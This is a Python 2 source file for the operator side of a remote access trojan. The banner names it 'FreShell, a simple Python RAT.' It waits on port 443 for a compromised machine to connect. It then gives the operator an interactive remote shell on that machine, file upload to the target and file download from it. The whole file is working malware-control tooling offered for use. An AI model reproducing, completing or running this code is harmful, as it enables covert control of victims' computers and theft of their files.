import os
import socket
import subprocess
import sys


host = ''
port = 443

def connect():
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error, msg:
        print "Couln't Create Socket."
        exit()

def bind():
    try:
        s.bind((host, port))
    except:
        print "Cannot bind Socket & Port."
        exit()

def accept():
    try:
        s.listen(1)
    except socket.error:
        print "wtf, can't listen?! What did you DO!?"
        exit()
    global conn, addr
    conn, addr = s.accept()

def banner():
    print "\n[+] Freshnut's FreShell, a simple Python RAT. [+]\n"
    print """
==============================================================================
@@@@@@@@  @@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
@@!       @@!  @@@  @@!       !@@       @@!  @@@  @@!       @@!       @@!       
!@!       !@!  @!@  !@!       !@!       !@!  @!@  !@!       !@!       !@!       
@!!!:!    @!@!!@!   @!!!:!    !!@@!!    @!@!@!@!  @!!!:!    @!!       @!!       
!!!!!:    !!@!@!    !!!!!:     !!@!!!   !!!@!!!!  !!!!!:    !!!       !!!       
!!:       !!: :!!   !!:            !:!  !!:  !!!  !!:       !!:       !!:       
:!:       :!:  !:!  :!:           !:!   :!:  !:!  :!:        :!:       :!:      
 ::       ::   :::   :: ::::  :::: ::   ::   :::   :: ::::   :: ::::   :: ::::  
 :         :   : :  : :: ::   :: : :     :   : :  : :: ::   : :: : :  : :: : :  
==============================================================================

Awaiting for connection.."""

def menu():
    if addr:
            os.system("clear")
            sys.stdout.write("[+] Connected: ")
            print addr
    options = """
Options:

  1               Interactive Shell
                  Type "quit" to return to menu from Interactive Shell
  2               Upload File to CWD
  3               Download File
  4               Target IP & Port
  quit            Quit
  help            Display Options
  disconnect      Disconnect from Client"""
    print options
    while True:
        choice = raw_input("> ")
        if choice == "1":
            print "[+] Entering Shell\n"
            #conn.send("[+] Interactive Mode Enabled")
            command()
        elif choice == "2":
            print "Upload File to: ", addr
            conn.send("rcv_file")
            snd_file()
        elif choice == "3":
            print "Download File from: ", addr
            conn.send("snd_file")
            rcv_file()
        elif choice == "4":
            sys.stdout.write("Target: ")
            print addr
        elif choice == "quit":
            print "[+] Exit"
            conn.close()
            s.close()
            exit()
        elif choice == "help":
            os.system("clear")
            print options
        elif choice == "disconnect":
            print "[+] Disconnecting Target"
            conn.send("disconnect")
            conn.close()
        else:
            print "[-] wtf.. you broke it."
            exit()

# Interactive Shell
def command():
    # cwd = conn.recv(1024) # Get CWD on intial connection
    while True:
        # sys.stdout.write(cwd)
        cmd = raw_input("#> ")
        split = cmd.split(" ")
        cd = split[0]
        path = split[-1]
        try:
            conn.send(cmd)
        except:
            print "[-] Cannot send user input."
        if cmd == "quit":
            menu()
        elif cd == "cd":
            continue
        else:
            data = conn.recv(4096)
            sys.stdout.write(data)
            sys.stdout.flush()


# Upload File
def snd_file():
    input_f = raw_input("File path: ")
    try:
        conn.send(input_f)
    except socket.error:
        print "[-] Cannot send file path."
    snd_f = open(input_f, "rb")
    read = snd_f.read()
    try:
        conn.send(read)
    except socket.error:
        print "[-] Cannot send data."
    snd_f.close()
    print "[+] File Sent"


# Download File
def rcv_file():
    loc_f = raw_input("Remote file path: ")
    split = loc_f.split("/")
    filename = split[-1]
    try:
        conn.send(loc_f)
    except:
        print "[-] Cannot receive file location."
    try:
        data_f = conn.recv(10000)
    except:
        print "[-] Cannot receive data."
    rcv_f = open(filename, "wb+")
    rcv_f.write(data_f)
    rcv_f.close()
    print "[+] File retrieved"


def main():
    banner()
    connect()
    bind()
    accept()
    menu()
    s.close()

main()
